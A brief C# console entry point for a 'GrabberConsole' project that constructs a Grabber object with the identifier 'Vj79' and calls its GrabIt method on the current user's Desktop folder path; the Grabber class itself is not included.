using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;


namespace GrabberConsole
{
    class Program
    {
        static void Main(string[] args)
        {
            
            Grabber Grab1 = new Grabber("Vj79");
            //Console.WriteLine(Grab1.IdentificateName(Grab1.ToGrab));
            //Console.WriteLine("");
            


            string desktopFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);


            Grab1.GrabIt(desktopFolderPath);


            //Console.ReadKey();
        }
    }
}
